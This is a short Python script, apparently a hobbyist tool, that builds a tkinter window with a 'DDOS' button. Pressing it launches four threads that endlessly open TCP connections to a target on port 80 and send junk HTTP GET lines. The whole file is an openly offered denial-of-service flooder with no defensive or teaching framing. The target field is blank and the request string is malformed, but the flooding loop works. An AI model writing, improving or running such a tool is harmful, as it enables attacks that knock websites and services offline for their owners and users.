import socket
from threading import Thread
from tkinter import *
host = "" #input("Enter a host: ")
target = host #socket.gethostbyname(host)
port = 80
def ddos():
    while True:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as mysocket:
            try:
                mysocket.connect((target, port))
                #random scheiß daten
                mysocket.send(str.encode("GET " + "button" + "HTTP/1.1 \r\n"))
                mysocket.sendto(str.encode("GET " + "button" + "HTTP/1.1 \r\n"), (target, port))
            except socket.error:
                print("error")
        mysocket.close()
def start():
    for i in range(4):
        t = Thread(target=ddos)
        t.start()
window = Tk()
window.title("tkinter_ddos")
window.minsize(width=400, height=300)
dos_button = Button(window, text="DDOS", command=start)
kill_button = Button(window, text="kill", command=quit)
dos_button.pack()
kill_button.pack()
window.mainloop()
